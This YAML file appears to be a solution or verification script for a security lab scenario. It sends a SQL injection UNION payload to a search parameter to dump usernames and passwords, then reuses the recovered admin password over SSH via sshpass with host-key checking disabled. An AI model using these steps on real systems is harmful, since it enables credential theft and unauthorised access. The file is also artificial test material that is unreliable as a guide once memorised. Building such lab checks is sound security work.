- entity_id: sqli_login
  procedure:
    sessions: []
    procedure:
    - step_id: verify_app_running
      session: null
      action:
        type: http_request
        method: GET
        url: http://${target_host}:${target_port}/index.php
        headers: {}
        body: null
      expect:
        status: 200
      outputs: {}
      timeout: 10
    - step_id: exploit_sqli_union
      session: null
      action:
        type: http_request
        method: GET
        url: http://${target_host}:${target_port}/index.php?search=x%27+UNION+SELECT+username%2Cpassword+FROM+users--+-
        headers: {}
        body: null
      expect:
        body_contains: S3cur3P@ssw0rd
      outputs: {}
      timeout: 10
    - step_id: verify_admin_credentials
      session: null
      action:
        type: http_request
        method: GET
        url: http://${target_host}:${target_port}/index.php?search=x%27+UNION+SELECT+username%2Cpassword+FROM+users--+-
        headers: {}
        body: null
      expect:
        body_regex: <td>admin</td><td>S3cur3P@ssw0rd</td>
      outputs: {}
      timeout: 10
- entity_id: ssh_access
  procedure:
    sessions: []
    procedure:
    - step_id: verify_ssh_running
      session: null
      action:
        type: exec_target
        command: service ssh status || ps aux | grep sshd
      expect:
        exit_code: 0
      outputs: {}
      timeout: 10
    - step_id: exploit_ssh_login
      session: null
      action:
        type: exec_attacker
        command: sshpass -p 'S3cur3P@ssw0rd' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
          admin@${target_host} 'id && whoami && hostname'
      expect:
        stdout_contains: uid=1000(admin)
      outputs:
        ssh_output: stdout
      timeout: 30
    - step_id: verify_success
      session: null
      action:
        type: exec_attacker
        command: sshpass -p 'S3cur3P@ssw0rd' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
          admin@${target_host} 'id'
      expect:
        stdout_regex: uid=1000\(admin\)
      outputs: {}
      timeout: 30
